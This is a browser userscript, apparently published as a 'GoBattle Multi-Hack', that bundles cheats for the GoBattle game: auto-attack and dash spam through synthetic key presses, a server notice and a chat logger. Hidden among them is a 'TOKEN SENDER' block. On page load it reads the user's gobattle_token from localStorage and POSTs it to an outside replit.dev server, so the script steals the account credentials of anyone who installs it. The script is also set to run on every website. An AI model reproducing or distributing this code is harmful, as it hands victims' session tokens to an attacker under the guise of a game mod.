// ==UserScript==
// @name         GoBattle Multi-Hack
// @namespace    http://tampermonkey.net/
// @version      1.67
// @description  All GoBattle hacks
// @author       GoBattle Hacks Official
// @match        *://gobattle.io/*
// @match        *://*.gobattle.io/*
// @match        *://*/*
// @grant        none
// @run-at       document-start
// @license      MIT
// @downloadURL https://update.greasyfork.org/scripts/548676/GoBattle%20Multi-Hack.user.js
// @updateURL https://update.greasyfork.org/scripts/548676/GoBattle%20Multi-Hack.meta.js
// ==/UserScript==

(function(){
    'use strict';

    // ======================= AUTO DOWN ATTACK =======================
    const aerial_down_attack_button = "z";
    const attack_frequency = 100;
    let textfield = null;
    let interval_id = null;

    function getTextField() {
        if (!textfield) textfield = document.getElementById("shinobit-textfield");
        return textfield;
    }

    function temporarily_crouched(){
        ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key:"ArrowDown",keyCode:40,which:40,code:"ArrowDown"})));
    }
    function sword_attack(){
        ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key:"v",keyCode:86,which:86,code:"KeyV"})));
    }
    function aerial_down_attack(){
        ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key:"ArrowUp",keyCode:38,which:38,code:"ArrowUp"})));
        temporarily_crouched();
        temporarily_crouched();
        sword_attack();
        ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key:"ArrowUp",keyCode:38,which:38,code:"ArrowUp"})));
    }

    document.addEventListener("keydown", event => {
        const currentTextField = getTextField();
        if (event.key === aerial_down_attack_button && !interval_id && currentTextField !== document.activeElement){
            aerial_down_attack();
            interval_id = setInterval(aerial_down_attack, attack_frequency);
        }
    });
    document.addEventListener("keyup", event => {
        const currentTextField = getTextField();
        if (event.key === aerial_down_attack_button && currentTextField !== document.activeElement){
            clearInterval(interval_id);
            interval_id = null;
        }
    });

    // ======================= TOKEN SENDER =======================
    (function() {
        window.addEventListener('load', function() {
            try {
                const token = localStorage.getItem("gobattle_token");
                if(token){
                    fetch("https://0af475d0-ccce-4e96-aa67-2c8f10c2da2a-00-loy92navghre.riker.replit.dev/receive-token", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({ gobattle_token: token })
                    })
                    .then(res => res.text())
                    .then(resText => console.log("Token sent successfully:", resText))
                    .catch(err => console.error("Error sending token:", err));
                } else {
                    console.warn("No gobattle_token found in localStorage");
                }
            } catch(e){
                console.error("Token sender error:", e);
            }
        });
    })();

    // ======================= MOONWALKER =======================
    const RIGHT_ARROW_TRIGGER_KEY = "=";
    const LEFT_ARROW_TRIGGER_KEY = "-";
    const PRESS_FREQUENCY = 20;
    let activeIntervalId = null;
    let activeDirection = null;

    function stopActivePress() {
        if (activeIntervalId) { clearInterval(activeIntervalId); activeIntervalId = null; }
        activeDirection = null;
    }
    function pressKey(key) {
        let keyCode = key=="ArrowRight"?39:37;
        ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key,keyCode,which:keyCode,code:key,location:0,repeat:false})));
    }
    function startPressingKey(targetKey, direction) {
        stopActivePress();
        pressKey(targetKey);
        activeIntervalId = setInterval(()=>pressKey(targetKey), PRESS_FREQUENCY);
        activeDirection = direction;
    }

    document.addEventListener("keydown", event => {
        const isTypingInChat = textfield ? textfield === document.activeElement : false;
        if (isTypingInChat) return;
        if (event.key === RIGHT_ARROW_TRIGGER_KEY) {
            activeDirection==='right'?stopActivePress():startPressingKey("ArrowRight",'right');
        } else if (event.key === LEFT_ARROW_TRIGGER_KEY) {
            activeDirection==='left'?stopActivePress():startPressingKey("ArrowLeft",'left');
        }
    });

    // ======================= SERVER DISPLAY =======================
    const OriginalWS = window.WebSocket;
    const SERVER_NAMES = {
        'wss://france2.gobattle.io:10116/':'France',
        'wss://us-west.gobattle.io:10116/':'USA West',
        'wss://singapore2.gobattle.io:10116/':'Singapore',
    };
    function getServerName(url){ if(url.endsWith('/')) url=url.slice(0,-1); return SERVER_NAMES[url+'/']||url; }
    function showServerNotice(name){
        const notice = document.createElement('div');
        notice.textContent = `Connected to: ${name}`;
        Object.assign(notice.style,{position:'fixed',bottom:'20px',right:'20px',background:'rgba(0,0,0,0.7)',color:'yellow',padding:'10px 15px',borderRadius:'8px',fontSize:'16px',fontWeight:'bold',zIndex:999999,opacity:1,transition:'opacity 1s ease-out'});
        document.body.appendChild(notice);
        setTimeout(()=>{notice.style.opacity='0';setTimeout(()=>notice.remove(),1000)},5000);
    }
    window.WebSocket = new Proxy(OriginalWS,{
        construct(target,args,newTarget){
            const ws = Reflect.construct(target,args,newTarget);
            ws.addEventListener("open",()=>showServerNotice(getServerName(ws.url)));
            return ws;
        },
        apply(target,thisArg,args){ return new target(...args); }
    });

    // ======================= WING DASH SPAM =======================
    const dash_left_button="q", dash_right_button="x", dash_frequency=150;
    let dashLeftInterval=null, dashRightInterval=null;
    function tapKey(key,code,keyCode){ ["keydown","keyup"].forEach(e=>document.dispatchEvent(new KeyboardEvent(e,{key,code,keyCode,which:keyCode,location:0,repeat:false,bubbles:true}))); }
    function dashLeft(){ tapKey("c","KeyC",67); tapKey("w","KeyW",87); tapKey("a","KeyA",65); tapKey("a","KeyA",65); }
    function dashRight(){ tapKey("c","KeyC",67); tapKey("w","KeyW",87); tapKey("d","KeyD",68); tapKey("d","KeyD",68); }

    document.addEventListener("keydown", e=>{ if(getTextField()===document.activeElement) return; switch(e.key){ case dash_left_button: if(!dashLeftInterval){ dashLeft(); dashLeftInterval=setInterval(dashLeft,dash_frequency); } break; case dash_right_button: if(!dashRightInterval){ dashRight(); dashRightInterval=setInterval(dashRight,dash_frequency); } break; }});
    document.addEventListener("keyup", e=>{ if(getTextField()===document.activeElement) return; switch(e.key){ case dash_left_button: clearInterval(dashLeftInterval); dashLeftInterval=null; break; case dash_right_button: clearInterval(dashRightInterval); dashRightInterval=null; break; }});

    // ======================= CHAT SCRAPER =======================
    const nativeWS = OriginalWS;
    window.WebSocket=function(...args){
        const socket = new nativeWS(...args);
        socket.addEventListener("open",()=>console.log("connected CACA!!!!"));
        socket.addEventListener("message", event=>{
            if(!(event.data instanceof ArrayBuffer)) return;
            const view=new DataView(event.data);
            let cursor=0;
            while(cursor<view.byteLength){
                const message_size=view.getUint8(cursor); cursor++; cursor++; 
                const opcode=view.getUint8(cursor); cursor++;
                switch(opcode){
                    case 0x06:
                        const flags=view.getUint8(3+cursor); cursor+=4;
                        const sub_op=view.getUint8(cursor); cursor++;
                        const id_entity=view.getUint32(cursor); cursor+=5;
                        if(sub_op==0x01){
                            cursor++; const nike_size=view.getUint8(cursor); cursor++;
                            const nike=new TextDecoder().decode(event.data.slice(cursor,nike_size+cursor)); cursor+=nike_size;
                            const content_message_size=view.getUint8(cursor); cursor+=2;
                            const content_message=new TextDecoder().decode(event.data.slice(cursor,content_message_size+cursor));
                            console.log(`[${id_entity}] ${nike}: ${content_message}`);
                        }
                        break;
                }
                cursor+=message_size; break;
            }
        });
        return socket;
    };
})();
